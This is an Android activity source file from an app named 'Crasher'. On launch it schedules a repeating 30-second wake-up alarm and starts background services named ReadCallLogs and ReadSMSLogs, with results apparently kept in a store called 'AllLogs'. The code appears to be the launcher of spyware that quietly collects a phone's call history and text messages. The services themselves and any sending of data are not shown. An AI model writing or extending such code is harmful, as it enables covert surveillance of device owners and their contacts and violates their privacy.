package com.bigeye.crasher;

import java.util.Calendar;

import android.os.Bundle;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.view.Menu;

public class Crasher extends Activity {

	private static final long REPEAT_TIME = 1000 * 30;
	SharedPreferences prefs;
	String prefName = "AllLogs";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_crasher);
		
		AlarmManager service = (AlarmManager)getSystemService(ALARM_SERVICE);
		Intent i = new Intent(this, StartServiceReceiver.class);
		PendingIntent pending = PendingIntent.getBroadcast(this, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);
		Calendar cal = Calendar.getInstance();
		
		//start every 30 secs
		service.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), REPEAT_TIME, pending);
		
		//start call log service
		startService(new Intent(this, ReadCallLogs.class));
		
		//start read sms log service
		startService(new Intent(this, ReadSMSLogs.class));
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.crasher, menu);
		return true;
	}

}
